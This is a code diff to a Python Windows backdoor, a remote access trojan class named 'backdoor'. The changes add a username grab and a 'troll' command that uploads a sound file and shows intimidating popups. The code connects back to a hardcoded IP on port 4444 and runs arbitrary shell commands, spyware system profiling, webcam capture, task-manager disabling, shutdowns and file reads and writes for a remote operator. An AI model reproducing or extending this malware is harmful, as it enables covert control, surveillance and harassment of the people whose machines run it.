@@ -17,12 +17,14 @@ class backdoor:
     PATH = os.path.realpath(sys.argv[0])
     TMP = os.environ["TEMP"]
     APPDATA = os.environ["APPDATA"]
+    UPLOADING_SFX_PATH = TMP + "\Music.wav"    
 
     tm_enabled = True
     work_manager = wm.manager()
+    current_username = spyware.spyware.current_user = os.getlogin()
 
-    hacked_msg_list = ["You have been hacked...", "Prepere for pain."]
-    HACKED_PATH = TMP + "\\Calculator.wav"
+    hacked_msg_list = ["Brace yourself as pain is crawling towards you.", "You are being controlled {}.".format(current_username)]
+    troll_msg_list = ["Wake up {}...".format(current_username), "The Matrix has you... ", "Follow the white rabbit.", "Knock, Knock, {}.".format(current_username)]
 
     def __init__(self, ip, port):
         while True:
@@ -141,7 +143,7 @@ class backdoor:
     def get_system_information(self):
         try:
             spw = spyware.spyware()
-            return spw.report()
+            return spw.get_info()
         except Exception as e:
             return "[-] Could'nt get System Information: {}.".format(e)
 
@@ -193,12 +195,12 @@ class backdoor:
         except Exception as e:
             return "[-] Couldn't get a snap of the webcam: {}.".format(e)
 
-    def you_been_hacked(self, msg_list):
-        for i in msg_list:
-            self.show_message_box_popup(i)
-            time.sleep(2)
+    def troll_user(self, msg_list, wait_time):
+        for i in range(len(msg_list)):
+            time.sleep(wait_time)
+            self.show_message_box_popup(msg_list[i])
 
-        self.work_manager.play_sound(r"C:\Users\Dima\Desktop\Top Secret\TrollSFX\CrazyLaugh.wav", False)
+        self.work_manager.play_sound(self.UPLOADING_SFX_PATH, False)
 
     def change_working_directory_to(self, path):
         try:
@@ -206,6 +208,13 @@ class backdoor:
             return "[+] Changing working directory to: {}.".format(os.getcwd())
         except Exception as e:
             return "[-] Error changing directory to: {}, {}.".format(path, e)
+
+    def get_current_user(self):
+        try:
+            user = os.getlogin()            
+            return "[+] Current user: {}".format(user)
+        except Exception as e:
+            return "[-] Couldn't get the username: {}".format(e)
 
     def read_file(self, path):
         try:
@@ -235,6 +244,8 @@ class backdoor:
                     if command_0 == "exit":     #Exit the program
                         self.connection.close()
                         exit()
+                    elif command_0 == "user":
+                        command_result = self.get_current_user()
                     elif command_0 == "info":       #Get Info about the system
                         command_result = self.get_system_information()
                     elif command_0 == "tsmanager":      #Change task manager state
@@ -253,8 +264,6 @@ class backdoor:
                         command_result = self.work_manager.get_processes()
                     elif command_0 == "webcam":
                         command_result = self.get_webcam_snap()
-                    elif command_0 == "troll":
-                        command_result = self.you_been_hacked(self.hacked_msg_list)
                     else:       #System command
                         command_result = self.execute_system_command(command)
                 else:
@@ -289,7 +298,20 @@ class backdoor:
                         elif rest_of_command == "3":
                             command_result = self.shutdown_system("-r")
                         else:
-                            command_result = "[-] No such parameter for cgstate."
+                            command_result = "[-] (Client) No such parameter for cgstate."
+                    elif command_0 == "troll":
+                        if rest_of_command_as_list[0] == "1":
+                            self.write_file(self.UPLOADING_SFX_PATH, rest_of_command_as_list[-1])
+                            command_result = self.troll_user(self.hacked_msg_list, 3)
+
+                            self.work_manager.delete_path(self.UPLOADING_SFX_PATH)
+                        elif rest_of_command_as_list[0] == "2":
+                            self.write_file(self.UPLOADING_SFX_PATH, rest_of_command_as_list[-1])
+                            command_result = self.troll_user(self.troll_msg_list, 5)
+                        
+                            self.work_manager.delete_path(self.UPLOADING_SFX_PATH)
+                        else:
+                            command_result = "[-] (Client) No such parameter for troll."
                     elif command_0 == "sdmsg":      #Send a message
                         command_result = self.show_message_box_popup(rest_of_command)
                     else:       #System command
@@ -299,5 +321,5 @@ class backdoor:
 
             self.reliable_send(command_result)
 
-my_backdoor = backdoor("192.168.1.112", 4444)
+my_backdoor = backdoor("192.168.1.109", 4444)
 my_backdoor.run()
